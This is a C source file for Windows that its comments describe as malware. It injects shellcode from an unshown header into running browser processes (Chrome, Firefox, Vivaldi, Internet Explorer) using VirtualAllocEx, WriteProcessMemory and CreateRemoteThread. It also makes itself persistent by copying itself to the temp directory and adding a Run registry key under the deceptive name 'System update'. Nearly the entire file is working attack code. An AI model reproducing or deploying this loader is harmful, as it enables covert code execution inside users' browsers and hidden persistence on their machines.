#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <string.h>
#include <time.h>

#include "shellcode.h"


const char* targetPorcess[] = {
	"notepad.exe",		// for Testing
	"firefox.exe",
	"chrome.exe",
	"vivaldi.exe",
	"iexplore.exe"
	//,"MicrosoftEdge.exe"
};


BOOL inject(DWORD pid) {
	HANDLE phd;
	LPVOID shell;

	phd = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	if (phd == INVALID_HANDLE_VALUE) {
		printf("OpenProcess() Failed.\n");
		return FALSE;
	}

	shell = VirtualAllocEx(phd, 0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shell == NULL) {
		printf("VirtualAllocEx() Failed\n");
		CloseHandle(phd);
		return FALSE;
	}

	if (!WriteProcessMemory(phd, shell, shellcode, shellcodeSize, 0)) {
		printf("Error: %i\n", GetLastError());
		return FALSE;
	}
	printf("Injection successfull\n");
	printf("Running Shellcode......\n");

	if (CreateRemoteThread(phd, NULL, 0, (LPTHREAD_START_ROUTINE)shell, NULL, 0, 0) == NULL) {
		printf("Failed to Run Shellcode\n");
		CloseHandle(phd);
		return FALSE;
	}
	CloseHandle(phd);
	return TRUE;
}


BOOL persistence() {
	HKEY hKey;
	char* currentPath = (char*)calloc(MAX_PATH, 1);
	if (currentPath == NULL)
		return FALSE;

	if (GetModuleFileNameA(NULL, currentPath, MAX_PATH)) {
		char* tempPath = (char*)calloc(MAX_PATH, 1);
		if (tempPath != NULL) {
			if (GetTempPathA(MAX_PATH - 1, tempPath)) {
				int randNb;
				srand((unsigned int)time(0));
				randNb = rand() % 1000000 + 100000;
				sprintf_s(tempPath, MAX_PATH, "%sdmp-%i.exe", tempPath, randNb);

				if (CopyFileA(currentPath, tempPath, FALSE)) {
					if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
						strcat_s(tempPath, MAX_PATH, " -p");
						RegSetValueExA(hKey, "System update", 0, REG_SZ, (LPBYTE)tempPath, (DWORD)strlen(tempPath) + 1);
						RegCloseKey(hKey);
						free(tempPath);
						free(currentPath);
						return TRUE;
					}
				}
			}
			
			free(tempPath);
		}
	}
	free(currentPath);
	return FALSE;
}


int main(int argc, char *argv[]) {
	HANDLE snap;
	PROCESSENTRY32 pe32;

	// check if the malware is run form the system 
	if (argc == 1) {
		// if it's the user that start the malware 
		if (persistence())
			printf("persistence OK\n");
		else
			printf("persistence Error\n");
	}

	pe32.dwSize = sizeof(pe32);
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot() Failed.");
		return FALSE;
	}

	if (!Process32First(snap, &pe32)) {
		printf("Process32First() Failed.");
		return FALSE;
	}

	for (int i = 0; i < sizeof(targetPorcess) / sizeof(char*); i++) {
		while (0 != strncmp(targetPorcess[i], pe32.szExeFile, strlen(targetPorcess[i])) && Process32Next(snap, &pe32));
		if (0 != strncmp(targetPorcess[i], pe32.szExeFile, strlen(targetPorcess[i])))
			printf("No infomation found about \"%s\"\n", targetPorcess[i]);
		else {
			printf("Program name:%s\nProcess id: %d\n", pe32.szExeFile, pe32.th32ProcessID);
			printf("Injecting shellcode\n");
			if (inject(pe32.th32ProcessID))
				printf("shellcode Execution Successfull\n");
			system("pause");

			CloseHandle(snap);
			return TRUE;
		}
	}

	CloseHandle(snap);
	system("pause");
	return FALSE;

}